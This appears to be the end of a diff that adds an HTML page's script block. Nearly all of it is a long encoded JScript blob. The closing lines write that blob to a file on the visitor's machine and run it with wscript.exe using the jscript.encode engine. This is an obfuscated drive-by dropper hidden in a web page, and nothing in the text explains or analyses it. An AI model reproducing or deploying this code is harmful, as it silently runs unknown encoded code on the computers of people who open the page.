+X+Eid\\0%.R)DT;:xOd{Bz&n=LdmMraY x1WNPmUxb+ l	k~v3Bz$lB3kik-0L.RUl-+cbp8^lD^tv+b`)88NW!x^YbG	P5+c1;`.ls**	-lMPUrm6h{v@!eOO])H1&2R&3&ff~sT%l*vRF1D O@*vIb0cN2CHLc.lV**"{Ukm6A#P\\C.,;x04m{tX!.X`.lVX#I-mD~3b*kK\'5T$+E .wsl1nvzw\'zT~B\'-\'wB*i-lMP-T^,:{VkWkWc.nw^l1+czwvJoSB\'w-EBbI7lD~2FD+;{v@!tOsV@*-x@!/1.kaY~YHwnxrY+XOzNl\\md^DbwDJ@*-U@!eOR-	-lMPCz6wvxUh~b1Ob\\nor(L+1YvwBUm.kaYrUTRsbs+UX/Dnhr(LmO-vbp\\CD,[3lt0x	+h~)1Yr\\p}4%mD`-EU^DbwORUtns^-B*I\\mDPk*q3R\'mXWw V+O?anmblsoKVNn.v bi7CMP8Th2E\'mX62vcMnY:+h2gl:c#p\\lM~-VX%1\'wBvQ7!s,sQB\'BQjDDkULc0.Ws/4l.;W9+`Z#p-lMP.hHoXxmX0aR;D+mOnK6DsrVnckcq3RQ-E-ww\'-BQ8ThfEBOMEn*iMhXT*c	DbYn`7Va01#iMAXT*R;sG/`*i[3X4RR]E	c-Ehd^MkwO 6nPJ&)%kmMkwDRUmKNnP\'BQdWF3RQ-E--\'wwB34ThfEQwEP&Y\'v#p-U&JOO@*w	@!&/1.bwO@*-	@!z4Yss@*EirW24.c.l+^X~Z#iD.z	7lMPVczT9\'2%!aycr2n	K+aOwks+v"m+sl~y#i0cHTNc.kD+Jr	+`	rlXh#pV*XZNc.kOndkU+v5x0t^bp3czT9R	DbOSr	+vwGM $bi0cz!9R/sK/+vbi)mlD^4`#P8N8W;	mOkKUP$l1-X`w5hlvb	7CMPOOc6/\'	+S~2	Eh+MlOGM`wR;6.RMOoW^NDcw5hlvbRwrV/bI6WDcOOcW/chK\\nwkM/Yv#pZYOcW/clO3	N`*IYOc0k hW7+g+aYcb*	-lM~E+ya%{Y,*WkRrYhv# hlDtib0vc42;**vE"XL#{xB9WmEkk42;W*cE"XLb\'{vNKmav-u4f5W*cE+"XLb{\'EDY6B*\'[9 80l`;.6L* /!4/D.c!B *"xB=yE#`YZnD6`25s*vQv\'-v_9+(0XvE+y6N#3vRN/nB*irG24Dv;v.6LBf0#p8Vd+~r6`8&$**vE"XL#xxEtO:Ek-4f$cl`E+yX%#{\'vtD:sv*	;+*m$`E+"aL*i)jm.raY ?^n+a`*bp88W;	mOkKU,D^scS`YS+XG#PDnY!DU~X+h2zR"+o"nCNvB_|/IwwE_OhaW3BwwE#iNW!x^YbG	PdOyk:`*	S4k^+cm74C5{\'0RCFO#	D.z	7lMPz\\*;W\'U+S~b1Yr-(r8%mO`E	Um.bwDR1YSGD0Bbi7l.~my\\W^\'H\\c!* 2	Es1nYAGM39Db-+k`bI6WDc-mD~k{qpk@!my7cmcVUoDtIk3\'+bPY!.0vly7*^R&Y:ckbQE-wl	UkRCUbB#I20kOwvC.\\*1R&Y+s`bb_E-wB*i5CO\\6vCy7cmc(O+s`b#QBwwE#I8)^lDm4c#	N	Um.kaOc?s+a`,Z!ZT!*iN86EU^DkW	~YZ+D6cU*O0l#`kWc1h*DDcxl,WX*"\'1+ZFb	bG24.vxl,0l~ZbiDDz	7l.~M&h+2\'a%EX" ZM+mYnKnaDsrVcxl,WXBYD;n*i.&SaR	MkD+`$!$nE*i.&Sv2 ;VWkn`*i81COm4`#`kWca%;6. sKV[nM26rdD/cxl16*b*	H%EXcvU*O0X#pYTnM0`	X,6*#pNN0bxmVsX`r6`8&$**vxX16*#ZxELd+EbPkG24M`xl,6X~2,bi)8NN6Ex1OkKxPXULt8`*	ODz`7l.P1tTxxah&z "+LIC9`v_|;j-\'?KWYSl.+\'-\\r1DWkG0D--qrUNKhk-wZ;.M+UYjnDkkGU\'-2a2^W.+Mw\'?4V^PsKV9nDk-wZGP$;Mxk	LB*iYZn.0v+OtLxQv\'-Cx	r+clUrE#iLVF/%`14oU3B\'-l!YK.E	Rrx6BbI)mlD^tv+#PNN0!x1YrWU~H%;6Wc++ld^*	Y.zPw0EX"cfn^+D+sKV9nDv+lkmSOME+*I81lY14c+*	X+A&z "EU`E^:9RnaPz^~MN~zk~J;~\'-\'-R\'-rv_vC/1_vEE~!BOD!+#pNN0!x1YrWU~.!86^c#PY.zP6+AfHR]+T9VnD+vBCnZ"w-C-w/4+ss6-\'/W	Y+XO\\+	E_lUNsnM/w-}2+	P	rDt-wv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvckU0Eb_E-wd4+Vsw\'qU/DC^Vw\'mK::mx9w-E~vmsN nX+PJ^P9+V,&5PJ0,JYFEvBB]2Vm2on)HG{?tv*iNmmO1tc#P8YMXPa+S&zR"+L	MkYcB_|Z"wwB3D1:*hcvc9j2Eb_E-wj4+Vsw\'2[kDw\'ZGs:mxN\'-ESD1:*hvD^hWh`E 9U2B*Qv-\'?4+sVww}wnx\'wZK:hC	N-wv*~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+TfnVnO`vCn/I\'-vQMm:*AvB 9U3E#QE-\'?tV^w-}wnxy-wv*i81CY1t`b`8DDH	a+AfHR]+T9+^+OnvBCF/"-wB3.1:*S`ER9U2Eb_E-w?4+ss\'-ranxy--;Gh:mx9-wBbI)mCY14`#`NDDX`ahfXc]o9VY+vB_FZ"-wB3D^hWh`E 9U2B*Qv-\'?4+sV3a\'-KDK2+MYzj4++Oumx[V.k-wq?_nDKwkw-E#I81lO^4`+*`8DDXPanh2XcIno	.bYn`Eu|;IwwE_D^hWhcBc.ov*_E--ktsV\'-Gwxww1W:sCx9--ESvmsNc+a+~&1P[+^~z$P&W,J]qEE~vIA!|2phbgf{U}Ebi)mCY1tcn*	8D.XP6+SfzR"+T.kOnvBu|;i-\'?GWDhl.n\'-\\k1.K/G6Y\'-bx9Ghk-wZ!D.n	Y../bWx\'wKW^k1kn/wwA62VK.+M-wHKsksnz/dW1rmYnE~EFBBB"3M|f	r"fvbp8mmOm4`+*`NYMXP6nhfzcInoq.kD+cv_|Ziw\'?G0DAmDn\'-tkmMWkG0D-wbx[GS/-\'/EMD+	O#+M/bWU-wKKVrmbn/\'-jzkY+hw\'fr/m8^+]ob/YMX:GW^/v~EFvSEI2VmfqrIGvbi)mmY^tcn*	NYMz	X+AfHRInLqDrYcECF;j\'-?K0DAlM+w-tk^.K/W6O-\'k	[Ghk-\'Z;D.n	Y#+MdkKxwwhWVr^b+d-\'jH/O:\'-fb/m8VKC/0HL.E~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnZ`w-UWWYSl.n\'-nKsk1k+kwwHbmMWdWWO\'-\\H;w-"+dOMkmOPKnnDsrDYn9?	lwbxkv~EFv~EI3!|f}]fE#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'lOOMk4cn6--Gn8EToDv~v^sN +XnPJm~.:BbI)mCY14v+bP8DDXP6A&HR]+T.rD+`Eu|dH-\'j6s:zI3-w\\bm.WkG0D-w	bxNGAkPHK\'w;E.M+	Y.DkrW	-wqslLn,sk^nPA6+1;OkKx,r2YrG	/w-m;YKD;UkR+an\'-9+(;TonMBBBmsNcn6P&m,Nns,z;,&0E#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9Whk~HK\'-;E.DnUD.nDkrW	-w(slon~wks+,3X+^!YbWx,raOkKxd-\'w.G1+6a +X+-\'9n4!oT+.BSv1:[Ra+,z^~9+V~&$P&0Ebp8^mY1t`#PNYMX`6hfzcI+T	DbY+vvu|dH\'-jroPqb]2\'wHbm.GkW0Ow\'rx9GS/~gK\'-Z!DMnxD.nDkkGU\'-qsCoPsbsnPA6m;YrG	P6wDrW	/wwM+o nX+w-Gn(ELT+MB~Ems[R6nPJm~.:B*I81lY14c+*	)Y.X`ahfXc]+T.rD+`vunS\\-\'j}sPqb"2-\'Hb^DK/G0D-w	bxNKA/,1K\'w/EMDxO.n.kkGx\'wqslLn,sksn,2a+1;DkG	P}wYbW	d-\'InozVz"DRa+\'-f8;oT+MBSB^h9Rn6~z1P[n^Pz5~J0v#pN1lO1tv+#P8D.XP6nh2X ]oMrY`B_FJH\'-UroK	)"2w-trmMWdG6Y-w	bx[WSd,1P\'-;EDM+	O.DdkKxww&:lTnPwkV~36m!YrWU~}wOkKU/\'-OCk33rs^Rn6w\'fn(ETo+MBBvmsN +X+~&1PDhB*i81COm4`#`8O.H	a+SfXcInLqDkOnvBu|d\\\'-j}s:b"2\'wHbm.WkWWO\'-bUNKh/,HP-\'Z!D.+UOj+./bGx\'-	r	VWLG	-wjknMkUbYE~yH X1_E-wEk+.r	kYcn6~hk^.kaYc+a+~&J+lLk^DbwO xmG[Pv_60mF13B,z+E#pNmmY^tv+b`)YDH`6h&H ]+TMkO+cv_|JH\'w?}sP	zI2wwtk^DKdK0O\'-qkx9WSd-\'Z;DM+UOj+DkrW	--Aa2VKDDw-)[7lUm[-\'sGs9+Dww_k[+wr^+3XY\'-j	m4nm0+[.mV;nE~B8v~EI2Vm9}IGBbiN^mY^tvn#P8O.H	6nA2X ILqDrD+vBCnStw-UroKqb]3\'-Hb^DK/W6Ow-qk	NGhdw\'Z;DMnxD.n.kkWUw\'2aw^GM+.\'-zN\\mx1nN\'-oW^Nn.\'-?!2+MCk9[nx\'-`x^tn^0+[.msEBSvZB~v]AMmfq6"fv*i)mlDm4c+*	NYMX`ah&H IoMrO+vB_|JHwwUroKq)IA-wKKVk^r/w-tr1DGkW6Y-\'bUNKhdPgKwwUX/Dn:"+/DG.+\'-Gkdl8sZGx6roE~vqE~B]3V{9}]GBbp81lY1tvn#P8ODH	anS&Xc]+TDbOn`ECnS\\-wj}sPz]2\'-KG^kmrnk-wHb^MWdK0D--qk	[WS/~1:-wjH/YhI/YK.n-\'fb/C4snUIv~EqBBB]3V{f	6"fv#pN1lO1tv+#P8)WE	mOkKx~"ayWc#P\\lM~Cc$VD\'	?^.bwORz.o!:nUD/irWv4f;WXvm-(l$#"{BNd+E[\'lW;sOcV+	LY4@*!*`dhbY1tcl*5^Y qDn:v!bbPmldn,B&+El1*UN&v#i(DC3pmC/Pv&MB)^2%Mc`*I8Dl0i^ldn,B&/EllFE{;v#i8.lVi1Ck+~Ez	B)k,.d:v#I4M+CVpmlknPEzYEln,^L.`bianS&zR";xvB^h9Pz^~9+sPJ5,zW,B3m\\(l$S!*i8DlVI1l/~BJlB=n1VNyv#I6nA2X I!U`E+a2^WDn.c+a+,&~&k+^+mD~EQm74C;*i8.l3p[+6lE^Ol+OVNyc#IOMX`6A&HR];	`BAhaVCX.c+aPrB_1\\(C;c/;4kY.cZ~m78l$RVULY4OO#QB8nmEOk6;V|or.^{wC.D{v_m*$VOc1m:+9R&O+s`v;E#Qvcl\\bv#p8mmO^tv+*	N8Nn^/n	1VNycbp4\\X"8`bi)N.w"K+v#iFWMMAA==^#~@ '+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+'\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run('wscript.exe //e:jscript.encode '+s41k8+'\\'+bgw3u+' /t');
+//-->
+</script>
+</html>
